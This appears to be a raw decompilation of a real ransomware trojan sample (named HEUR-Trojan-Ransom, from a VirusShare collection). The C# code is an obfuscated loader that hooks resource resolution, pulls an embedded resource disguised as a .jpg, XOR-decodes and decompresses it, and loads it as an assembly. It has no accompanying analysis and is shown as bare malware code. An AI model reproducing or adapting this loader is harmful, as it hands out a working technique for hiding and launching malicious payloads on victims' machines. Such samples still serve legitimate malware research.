// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: Asphixere, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E674F363-54D5-428F-A0DB-A0B1E158EE32
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00024-msil\HEUR-Trojan-Ransom.Win32.Generic-7bc55c8e7ec718faa08bab4df750817091db1055cc70e398e6d6fa7e0b66b7e3.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;

internal class \u003CModule\u003E
{
  static Assembly ဆ\uFFFDꏢ醎팇쯆ꛠ憻;

  static \u003CModule\u003E() => AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u003CModule\u003E.吓ዟⲘ䭘絘쬋\u1AF5\u2BD1);

  internal static Assembly 吓ዟⲘ䭘絘쬋\u1AF5\u2BD1(object sender, ResolveEventArgs args)
  {
label_0:
    int num1 = 3;
label_1:
    bool flag;
    byte[] numArray;
    BinaryReader binaryReader;
    while (true)
    {
      byte num2;
      int num3;
      int index;
      Stream manifestResourceStream;
      switch (num1)
      {
        case 0:
          goto label_0;
        case 2:
          num3 = 2;
          break;
        case 3:
          flag = (object) \u003CModule\u003E.ဆ\uFFFDꏢ醎팇쯆ꛠ憻 != null;
          if (!flag)
          {
            num3 = 4;
            break;
          }
          goto label_42;
        case 4:
          num2 = (byte) ((int) num2 * 252 % ((1265858855 - 1088797081 ^ 214816181 ^ 181815765 + 1374954355 ^ 1904336679 ^ 1280932114) - (-2072893492 - 488605574)));
          num1 = 6;
          continue;
        case 5:
label_16:
          numArray = new byte[manifestResourceStream.Length];
          num3 = 11;
          break;
        case 6:
label_12:
          num3 = 6;
          break;
        case 7:
          index = 0;
          num1 = 8;
          continue;
        case 8:
label_18:
          flag = index < numArray.Length;
          if (!flag)
          {
            binaryReader = new BinaryReader((Stream) new DeflateStream((Stream) new MemoryStream(numArray), CompressionMode.Decompress));
            num3 = 9;
            break;
          }
          goto case 2;
        case 9:
label_14:
          ++index;
          num3 = 3;
          break;
        case 10:
          manifestResourceStream.Read(numArray, 0, numArray.Length);
          num3 = 8;
          break;
        default:
          num2 = (byte) (1351697489 - 1351697410);
          num1 = 7;
          continue;
      }
      while (true)
      {
        switch (num3)
        {
          case 0:
            goto label_0;
          case 2:
            numArray[index] = (byte) ((uint) numArray[index] ^ (uint) num2);
            num3 = 1;
            continue;
          case 3:
            num1 = 8;
            num3 = 13;
            continue;
          case 4:
            goto label_10;
          case 5:
            goto label_12;
          case 6:
            num1 = 9;
            num3 = 15;
            continue;
          case 7:
            goto label_14;
          case 8:
            goto label_15;
          case 9:
            goto label_22;
          case 10:
            goto label_16;
          case 11:
            num1 = 10;
            num3 = 14;
            continue;
          case 12:
            goto label_18;
          case 13:
          case 14:
          case 15:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      num1 = 4;
      continue;
label_10:
      manifestResourceStream = typeof (\u003CModule\u003E).Assembly.GetManifestResourceStream("멾祁䣍\u1C8Dꎭ\uEDCF倴\uF5D4.jpg");
      num1 = 5;
      continue;
label_15:
      num1 = 1;
    }
label_22:
    try
    {
      int num4 = 3;
      while (true)
      {
        switch (num4)
        {
          case 0:
            goto label_22;
          case 3:
            num1 = 1;
            num4 = 2;
            continue;
          case 4:
            num4 = 9;
            continue;
          case 5:
            num1 = 4;
            num4 = 6;
            continue;
          case 7:
            num1 = 3;
            break;
          case 9:
            num1 = 2;
            num4 = 1;
            continue;
          case 10:
            \u003CModule\u003E.ဆ\uFFFDꏢ醎팇쯆ꛠ憻 = Assembly.Load(numArray);
            num4 = 5;
            continue;
        }
        switch (num1)
        {
          case 0:
            goto label_22;
          case 2:
            num4 = 7;
            continue;
          case 3:
            goto label_37;
          case 4:
            Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
            num4 = 4;
            continue;
          default:
            numArray = binaryReader.ReadBytes(binaryReader.ReadInt32());
            num4 = 10;
            continue;
        }
      }
    }
    finally
    {
      flag = binaryReader == null;
      if (!flag)
        binaryReader.Dispose();
    }
label_37:
    int num5 = 1;
label_38:
    while (true)
    {
      Assembly assembly;
      int num6;
      do
      {
        switch (num5)
        {
          case 0:
            goto label_37;
          case 2:
label_40:
            num1 = 2;
            goto case 6;
          case 3:
            goto label_42;
          case 4:
label_43:
            return assembly;
          case 5:
            num1 = 4;
            num5 = 9;
            continue;
          case 6:
          case 9:
          case 11:
            while (true)
            {
              switch (num1)
              {
                case 0:
                  goto label_37;
                case 2:
                  goto label_43;
                case 3:
                  num1 = 2;
                  continue;
                case 4:
                  goto label_40;
                case 5:
                  goto label_41;
                case 6:
                  goto label_46;
                default:
                  goto label_52;
              }
            }
label_41:
            assembly = \u003CModule\u003E.ဆ\uFFFDꏢ醎팇쯆ꛠ憻;
            num5 = 7;
            continue;
label_46:
            assembly = (Assembly) null;
            num5 = 5;
            continue;
          case 7:
            num1 = 3;
            num5 = 6;
            continue;
          case 8:
            num1 = 6;
            goto case 6;
          case 10:
            num6 = flag ? 1 : 0;
            num1 = 5;
            num5 = 11;
            continue;
          default:
            num1 = 1;
            goto case 6;
        }
      }
      while (num6 != 0);
      num5 = 8;
      continue;
label_52:
      num5 = 3;
    }
label_42:
    flag = Array.IndexOf<string>(\u003CModule\u003E.ဆ\uFFFDꏢ醎팇쯆ꛠ憻.GetManifestResourceNames(), args.Name) != -1;
    num5 = 10;
    goto label_38;
  }
}
